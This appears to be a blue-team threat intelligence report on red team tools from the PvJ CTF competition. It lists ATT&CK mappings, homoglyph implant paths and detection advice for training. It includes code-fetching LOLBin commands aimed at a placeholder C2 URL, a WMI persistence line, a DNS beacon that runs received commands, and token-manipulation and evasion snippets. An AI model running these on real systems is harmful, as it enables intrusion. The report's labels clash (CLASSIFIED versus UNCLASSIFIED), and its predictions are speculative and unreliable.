# 🧨 PvJ Red Team Toolset Intelligence Report

**Classification**: CLASSIFIED  
**Distribution**: Blue Team Training Use Only  
**Date**: January 2025  
**Source Repository**: [iDigitalFlame/PvJ-CTF-RedTools](https://github.com/iDigitalFlame/PvJ-CTF-RedTools)  

---

## 📋 Table of Contents

1. [📌 Common Tactics, Techniques, and Procedures (TTPs)](#-common-tactics-techniques-and-procedures-ttps)
2. [♻️ Tool Reuse and Code Patterns](#️-tool-reuse-and-code-patterns)
3. [🚨 Indicators of Compromise (IoCs)](#-indicators-of-compromise-iocs)
4. [🔮 Predictive Threat Forecasting](#-predictive-threat-forecasting)
5. [📊 Summary Table](#-summary-table)

---

## 📌 Common Tactics, Techniques, and Procedures (TTPs)

### **Evolution Timeline & Framework Progression**

#### **AtHome-2020 (Empire Era)**
- **Primary Framework**: Empire C2 with PowerShell-based agents
- **Core Techniques**: Basic beacons, privilege escalation, network reconnaissance
- **MITRE ATT&CK Mapping**: T1059.001 (PowerShell), T1055 (Process Injection)

#### **BSidesLV-2021 to BSidesLV-2022 (Transition Period)**
- **Framework Evolution**: Introduction of ThunderStorm C2
- **Enhanced Capabilities**: Userland hooking, advanced persistence
- **MITRE ATT&CK Mapping**: T1055.012 (Process Hollowing), T1574.001 (DLL Search Order Hijacking)

#### **BSidesLV-2024 (Current State)**
- **Primary Framework**: ThunderStorm C2 with JetStream integration
- **Advanced Techniques**: Sophisticated evasion, API hooking, token manipulation
- **MITRE ATT&CK Mapping**: T1134 (Access Token Manipulation), T1562.001 (Disable or Modify Tools)

### **Core Attack Phases**

#### **Phase 1: Initial Access & Reconnaissance**
**MITRE ATT&CK Techniques:**
- **T1190**: Exploit Public-Facing Application (IIS misconfigurations)
- **T1078**: Valid Accounts (weak/unchanged passwords)
- **T1649**: Steal or Forge Authentication Certificates (AD CS exploitation)

**Technical Implementation:**
- **IIS Web Shell Deployment**: ASP-based command execution interfaces
- **Credential Harvesting**: Automated password spraying and credential stuffing
- **Certificate Authority Abuse**: ESC1-ESC8 exploitation techniques

#### **Phase 2: Persistence & Defense Evasion**
**MITRE ATT&CK Techniques:**
- **T1055**: Process Injection (userland hooking implementation)
- **T1574.001**: DLL Search Order Hijacking (legitimate-looking paths)
- **T1134.001**: Token Impersonation/Theft (integrity level manipulation)
- **T1562.001**: Disable or Modify Tools (API hooking for security tools)

**Technical Implementation:**
```c
// Userland Hooking Example (hook.c)
DWORD DoUntrust(void) {
    Sleep(500);
    HANDLE t;
    // Token manipulation for security tool evasion
    if (!OpenProcessToken(GetCurrentProcess(), 0x200A8, &t)) {
        return 0;
    }
    // Set untrusted integrity level
    SetTokenInformation(t, 0x19, &b, c + 4);
}
```

#### **Phase 3: Command & Control**
**MITRE ATT&CK Techniques:**
- **T1071.001**: Web Protocols (HTTP/HTTPS C2 communication)
- **T1573.001**: Symmetric Cryptography (encrypted beacon traffic)
- **T1090**: Proxy (multi-stage C2 infrastructure)

**Technical Implementation:**
- **ThunderStorm Bolts**: Primary implants for persistent C2
- **ThunderStorm Flurries**: Lightweight launchers and droppers
- **JetStream Integration**: User account manipulation and privilege escalation

#### **Phase 4: Lateral Movement & Privilege Escalation**
**MITRE ATT&CK Techniques:**
- **T1021.001**: Remote Desktop Protocol
- **T1021.002**: SMB/Windows Admin Shares
- **T1078.002**: Domain Accounts (compromised credentials)
- **T1543.003**: Windows Service (service installation for persistence)

**Technical Implementation:**
- **UserAdd Service**: Automated user creation with administrative privileges
- **Service Masquerading**: Legitimate-sounding service names for persistence
- **Scheduled Task Abuse**: Task hijacking for privilege escalation

#### **Phase 5: Impact & Psychological Operations**
**MITRE ATT&CK Techniques:**
- **T1489**: Service Stop (critical service disruption)
- **T1485**: Data Destruction (scorched earth tactics)
- **T1491**: Defacement (psychological warfare elements)

**Technical Implementation:**
- **API Function Interception**: Preventing process termination and analysis
- **Fake Process Lists**: Psychological elements (Rick Roll process names)
- **Security Tool Neutralization**: Task Manager and Process Hacker disabling

---

## ♻️ Tool Reuse and Code Patterns

### **Core Framework Components**

#### **ThunderStorm C2 Architecture**
**Consistent Elements Across Years:**
- **Bolt Implants**: Primary persistence mechanisms
- **Flurry Launchers**: Lightweight deployment tools
- **Duck Service**: Support binary framework with multiple disguises

**Code Pattern Evolution:**
```go
// AtHome-2020 Empire Integration (empire.go)
func main() {
    svc.Run(svcName, empire{})
}

func (empire) Execute([]string, r <-chan svc.ChangeRequest, i chan<- svc.Status) (bool, uint32) {
    // PowerShell beacon execution
    e := &cmd.Process{Args: pl}
    e.SetParentElevatedRandom(nil)
    e.Start()
}
```

#### **Persistence Mechanism Patterns**

**File Naming Convention Evolution:**
- **2020**: Basic legitimate-looking names
- **2021-2022**: Enhanced path masquerading
- **2024**: Unicode character substitution for evasion

**Examples:**
```
# Standard Paths (2020-2021)
C:\Windows\System32\svchost.exe
C:\Program Files\Common Files\system.exe

# Unicode Evasion (2024)
C:\Windows\System32\iphlpaрi.exe  # Cyrillic 'р' instead of 'p'
C:\Windows\System32\kbdazе.exe    # Cyrillic 'е' instead of 'e'
```

### **Shared Codebase Analysis**

#### **Duck Service Framework**
**Multi-Purpose Support Binary:**
- **Bitcoin Theme**: Cryptocurrency-themed disguise
- **Dolphin Theme**: Marine life-themed disguise  
- **Malware Theme**: Obvious malware for psychological effect
- **Duck Theme**: Default rubber duck mascot

**Common Functionality:**
```c
// Windows API Definitions (duck.c)
#define WINVER 0x0501
#define _WIN32_WINNT 0x0501
#define NOHH        // No help
#define NOMB        // No message box
#define NOMSG       // No messages
#define NONLS       // No NLS
#define NOMCX       // No common controls
```

#### **Hooking Infrastructure**
**Consistent API Interception:**
- **NtSuspendThread**: Prevents thread suspension
- **NtSuspendProcess**: Prevents process suspension  
- **NtTerminateProcess**: Prevents process termination
- **Task Manager Neutralization**: Token integrity manipulation

### **Framework Integration Patterns**

#### **Empire to ThunderStorm Migration**
**Architectural Shift:**
- **From**: PowerShell-heavy Empire agents
- **To**: Native binary ThunderStorm implants
- **Benefit**: Reduced detection surface, improved stealth

**Maintained Capabilities:**
- **Beacon Communication**: Encrypted C2 channels
- **Privilege Escalation**: Service-based elevation
- **Persistence**: Multiple redundant mechanisms

---

## 🚨 Indicators of Compromise (IoCs)

### **File System Artifacts**

#### **Implant File Paths (BSidesLV-2024)**
```
# Primary Implants (ThunderStorm Bolts)
C:\Windows\vpnplugins\juniper\JunosPulseVрn.exe
C:\Windows\System32\iphlpaрi.exe
C:\Windows\SysWOW64\en\AuthFWSnapIn.Resourceh.dll
C:\Windows\System32\SystemResetPlatform\SysResetLayoui.exe
C:\Windows\System32\rfxvmh.exe
C:\Program Files (x86)\Windows Multimedia Platform\desk.dll
C:\Windows\System32\migwiz\sfcm.dll
C:\Windows\System32\kbdazе.exe

# Launcher Implants (ThunderStorm Flurries)
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Windows.Forms\v4.0_4.0.0.0__b77a5c561934e089\System.Windows.Formq.dll
C:\Windows\diagnostics\system\UsbCore\VF_ResetOnResսme.dll
C:\Windows\System32\wbem\schaոnel.dll
C:\Windows\System32\mfsrcsnx.exe
```

#### **Web Shell Artifacts**
```asp
# ASP Web Shell (webshell.asp)
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<!-- Custom command execution interface -->
```

### **Process Behavior Indicators**

#### **Hooked Process Behaviors**
```powershell
# Abnormal tasklist output
PS> tasklist
Image Name                     PID Session Name        Session#    Mem Usage
duck.exe                        -1 Services                   1          0 K
never_gonna                     10 Console                    1          0 K
give_you_up                     11 Console                    1          0 K
let_you_down                    13 Console                    1          0 K

# Abnormal taskkill behavior
PS> taskkill /?
SUCCESS

# Task Manager integrity manipulation
# Process shows as "Untrusted" integrity level
```

#### **Service Installation Patterns**
```
# Service Names (Duck Framework)
- "Duck Service" 
- "Bitcoin Mining Service"
- "Dolphin Communication Service"
- "System Malware Service" (psychological warfare)

# Service Descriptions
- Legitimate-sounding descriptions for stealth
- Obvious malware descriptions for intimidation
```

### **Network Communication Indicators**

#### **C2 Communication Patterns**
```
# ThunderStorm C2 Traffic
- Encrypted HTTP/HTTPS beacons
- Regular 5-minute intervals (scoring synchronization)
- User-Agent strings mimicking legitimate software
- Certificate pinning for C2 validation

# Beacon Callback Structure
POST /api/v1/update HTTP/1.1
Host: [C2_DOMAIN]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/json
Content-Length: [ENCRYPTED_PAYLOAD_SIZE]

[ENCRYPTED_BEACON_DATA]
```

### **Registry Artifacts**

#### **Persistence Registry Keys**
```
# Service Registration
HKLM\SYSTEM\CurrentControlSet\Services\[SERVICE_NAME]
- ImagePath: [IMPLANT_PATH]
- DisplayName: [LEGITIMATE_SOUNDING_NAME]
- Description: [BENIGN_DESCRIPTION]

# Autostart Locations
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### **Log Artifacts**

#### **Windows Event Log Indicators**
```
# Security Log (Event ID 4688 - Process Creation)
- Unusual process creation in system directories
- Processes with Unicode character substitution
- Service installations with suspicious paths

# System Log (Event ID 7034 - Service Crash)
- Repeated service crashes and restarts
- Services failing to start due to integrity issues

# Application Log
- Task Manager access denied errors
- Process Hacker permission failures
```

### **Memory Artifacts**

#### **Process Injection Indicators**
```c
// Userland hooking signatures
- Modified API function entry points
- Injected DLL modules in legitimate processes
- Altered process token integrity levels
- Hooked system call tables
```

---

## 🔮 Predictive Threat Forecasting

### **Likely 2025 Tactical Evolution**

#### **Enhanced Evasion Techniques**
**Predicted Developments:**
1. **Advanced Unicode Obfuscation**: Extended character set abuse beyond Cyrillic
2. **Living-off-the-Land Binaries (LOLBins)**: Increased use of legitimate Windows tools
3. **Fileless Persistence**: Memory-only implants with registry-based configuration
4. **Container Escape Techniques**: Docker and Kubernetes exploitation capabilities

**Technical Predictions:**
```powershell
# Predicted LOLBin Abuse
certutil.exe -decode [BASE64_PAYLOAD] [OUTPUT_FILE]
bitsadmin.exe /transfer [JOB_NAME] [C2_URL] [LOCAL_FILE]
regsvr32.exe /s /n /u /i:[C2_URL] scrobj.dll

# Predicted WMI Persistence
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="[FILTER_NAME]", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="[WQL_QUERY]"
```

#### **AI-Enhanced Capabilities**
**Predicted Integration:**
1. **Adaptive Evasion**: Machine learning-based detection avoidance
2. **Dynamic Payload Generation**: AI-generated implant variants
3. **Behavioral Mimicry**: AI-driven normal user behavior simulation
4. **Automated Lateral Movement**: AI-guided network traversal

#### **Cloud-Native Techniques**
**Predicted Expansion:**
1. **Serverless C2**: AWS Lambda/Azure Functions-based command infrastructure
2. **Container Persistence**: Kubernetes pod hijacking and persistence
3. **Cloud Storage Abuse**: S3/Blob storage for payload hosting and exfiltration
4. **Identity Provider Abuse**: SAML/OAuth token manipulation

### **Novel Payload Predictions**

#### **DNS Tunneling Evolution**
**Predicted Implementation:**
```go
// Predicted DNS C2 Enhancement
func dnsBeacon(domain string, data []byte) {
    // AI-generated subdomain patterns
    subdomain := generateAIPattern(data)
    query := fmt.Sprintf("%s.%s", subdomain, domain)
    
    // Encrypted DNS TXT record responses
    response := queryDNS(query, "TXT")
    decryptedCommand := decryptAES(response)
    executeCommand(decryptedCommand)
}
```

#### **Hardware-Based Persistence**
**Predicted Techniques:**
1. **UEFI Bootkit Integration**: Firmware-level persistence
2. **TPM Abuse**: Trusted Platform Module exploitation
3. **GPU Computing**: Graphics card-based payload execution
4. **USB Firmware Modification**: BadUSB-style persistence

#### **Quantum-Resistant Cryptography**
**Predicted Adoption:**
```c
// Predicted quantum-resistant C2 encryption
#include <kyber.h>  // Post-quantum cryptography
#include <dilithium.h>  // Post-quantum signatures

// Quantum-resistant key exchange
kyber_keypair(public_key, private_key);
kyber_enc(ciphertext, shared_secret, public_key);
```

### **Psychological Warfare Evolution**

#### **Enhanced Intimidation Tactics**
**Predicted Developments:**
1. **Deepfake Integration**: AI-generated threatening videos
2. **Social Engineering Automation**: AI-driven phishing campaigns
3. **Ransomware Simulation**: Fake encryption for psychological pressure
4. **Real-time Taunting**: Live chat interfaces in compromised systems

#### **Gamification Elements**
**Predicted Features:**
1. **Achievement Systems**: Unlockable red team capabilities
2. **Leaderboards**: Real-time team performance tracking
3. **Easter Eggs**: Hidden challenges and rewards
4. **Narrative Elements**: Story-driven attack scenarios

### **Detection Evasion Predictions**

#### **ML-Based Evasion**
**Predicted Capabilities:**
```python
# Predicted AI evasion framework
import tensorflow as tf
from sklearn.ensemble import RandomForestClassifier

class EvasionAI:
    def __init__(self):
        self.detector_model = self.load_blue_team_model()
        self.evasion_generator = self.build_adversarial_network()
    
    def generate_evasive_payload(self, base_payload):
        # Generate adversarial examples against detection
        evasive_payload = self.evasion_generator.predict(base_payload)
        confidence = self.detector_model.predict_proba(evasive_payload)
        
        if confidence < 0.1:  # Low detection probability
            return evasive_payload
        else:
            return self.generate_evasive_payload(evasive_payload)
```

#### **Zero-Day Integration**
**Predicted Exploitation:**
1. **Browser Zero-Days**: Client-side exploitation via web interfaces
2. **Kernel Exploits**: Privilege escalation through undisclosed vulnerabilities
3. **Hardware Vulnerabilities**: CPU/chipset-level exploitation
4. **Supply Chain Attacks**: Compromised software dependencies

---

## 📊 Summary Table

| Tool Name | Purpose | Associated TTP | IoC Examples | Defensive Notes |
|-----------|---------|----------------|--------------|-----------------|
| **ThunderStorm Bolts** | Primary C2 implants | T1055 (Process Injection)<br>T1071.001 (Web Protocols) | `C:\Windows\System32\iphlpaрi.exe`<br>`C:\Windows\vpnplugins\juniper\JunosPulseVрn.exe` | Monitor for Unicode character substitution in filenames<br>Baseline legitimate system file locations |
| **ThunderStorm Flurries** | Lightweight launchers | T1055.012 (Process Hollowing)<br>T1574.001 (DLL Hijacking) | `System.Windows.Formq.dll`<br>`VF_ResetOnResսme.dll` | Check DLL integrity and digital signatures<br>Monitor for typos in system DLL names |
| **JetStream UserAdd** | User account manipulation | T1136.001 (Local Account)<br>T1078.003 (Local Accounts) | Service: "UserAdd Service"<br>Process: `user_add.exe` | Monitor user account creation events<br>Audit service installations |
| **Duck Service Framework** | Multi-purpose support binary | T1543.003 (Windows Service)<br>T1036.005 (Match Legitimate Name) | Service names: "Duck Service", "Bitcoin Mining Service"<br>Files: `duck.exe`, `bitcoin.exe` | Investigate unusual service names<br>Verify service binary legitimacy |
| **Userland Hooking (hook.c)** | API interception & evasion | T1055 (Process Injection)<br>T1562.001 (Disable Security Tools) | Abnormal `tasklist` output<br>Task Manager integrity errors | Monitor for API hooking indicators<br>Check process integrity levels |
| **ASP Web Shells** | Web-based command execution | T1505.003 (Web Shell)<br>T1059.001 (PowerShell) | `webshell.asp`<br>Suspicious IIS logs | Monitor web server file uploads<br>Scan for unauthorized ASP files |
| **Empire C2 (Legacy)** | PowerShell-based C2 | T1059.001 (PowerShell)<br>T1055 (Process Injection) | PowerShell beacon processes<br>Empire agent artifacts | Monitor PowerShell execution<br>Detect Empire-specific indicators |
| **Privilege Escalation Tools** | Service-based elevation | T1543.003 (Windows Service)<br>T1134 (Access Token Manipulation) | `elevate_exe.go` artifacts<br>Suspicious service installations | Monitor service creation events<br>Audit privilege escalation attempts |
| **Network Reconnaissance** | Target enumeration | T1018 (Remote System Discovery)<br>T1046 (Network Service Scanning) | `net.go` scanning artifacts<br>Unusual network traffic patterns | Monitor network scanning activity<br>Detect reconnaissance patterns |
| **Persistence Mechanisms** | Long-term access maintenance | T1547.001 (Registry Run Keys)<br>T1053.005 (Scheduled Task) | Registry autostart entries<br>Suspicious scheduled tasks | Monitor autostart locations<br>Audit scheduled task creation |

### **Key Defensive Priorities**

#### **High-Priority Indicators**
1. **Unicode Character Substitution**: Immediate investigation required
2. **Abnormal System Tool Behavior**: `tasklist`, `taskkill`, Task Manager anomalies
3. **Suspicious Service Installations**: Non-standard service names and descriptions
4. **Process Integrity Manipulation**: Untrusted integrity level assignments
5. **Web Shell Artifacts**: Unauthorized ASP files in web directories

#### **Detection Strategies**
1. **File Integrity Monitoring**: Baseline system directories and monitor for changes
2. **Process Behavior Analysis**: Monitor for API hooking and injection techniques
3. **Network Traffic Analysis**: Detect encrypted C2 communication patterns
4. **Registry Monitoring**: Track autostart location modifications
5. **Service Auditing**: Monitor service creation and modification events

#### **Response Recommendations**
1. **Immediate Isolation**: Quarantine affected systems upon detection
2. **Memory Analysis**: Capture memory dumps for forensic analysis
3. **Network Segmentation**: Prevent lateral movement through network isolation
4. **Credential Reset**: Force password changes for potentially compromised accounts
5. **System Reimaging**: Complete rebuild for confirmed compromised systems

---

**Document Classification**: UNCLASSIFIED  
**Last Updated**: January 2025  
**Next Review**: Pre-Competition 2025  
**Intelligence Confidence**: HIGH (based on direct source code analysis)

*This intelligence report is derived from open-source analysis of the PvJ-CTF-RedTools repository and is intended for educational and defensive preparation purposes only.*

